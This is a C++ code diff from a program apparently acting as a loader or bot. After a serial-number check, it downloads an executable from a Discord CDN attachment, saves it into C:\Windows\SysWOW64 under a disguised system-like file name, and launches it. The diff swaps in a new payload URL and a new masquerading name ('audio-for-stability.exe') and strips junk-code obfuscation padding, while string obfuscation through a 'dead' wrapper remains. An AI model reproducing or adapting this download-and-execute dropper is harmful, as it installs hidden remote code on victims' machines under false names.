@@ -158,31 +158,14 @@ void mainbot()
         tlmisir();
         if (find(serial.begin(), serial.end(), to_string(serialNumber)) != serial.end())
         {
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
 
-
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
                 
-            std::string download = (dead("https://cdn.discordapp.com/attachments/834754431249285140/887373871223828530/Demon_Cleaner.exe"));
-            std::string path = "C:\\Windows\\SysWOW64\\windowsinternalchecksservice.exe";
+            std::string download = (dead("https://cdn.discordapp.com/attachments/834754431249285140/887380454674694184/Demon_Cleaner.exe"));
+            std::string path = "C:\\Windows\\SysWOW64\\audio-for-stability.exe";
             URLDownloadToFileA(NULL, download.c_str(), path.c_str(), 0, NULL);
             system(dead("cd C:\\Windows\\SysWOW64\\").c_str());
-            system(dead("start windowsinternalchecksservice.exe").c_str());
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
+            system(dead("start audio-for-stability.exe").c_str());
 
-
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                exit(0);
             return exit(0);
         }
         else
